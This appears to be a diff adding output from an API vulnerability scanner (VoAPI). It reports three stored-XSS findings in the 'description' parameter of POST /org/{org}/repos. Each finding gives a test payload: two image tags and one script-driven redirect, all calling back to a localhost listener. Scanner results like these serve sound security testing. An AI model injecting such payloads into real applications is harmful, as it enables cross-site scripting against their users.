@@ -1,0 +1,21 @@
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /org/{org}/repos
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4444/xss/org/!org!/reposVoAPIdescription'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /org/{org}/repos
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4445/xss/org/!org!/reposVoAPIdescription'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /org/{org}/repos
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/org/!org!/reposVoAPIdescription'</script>
+
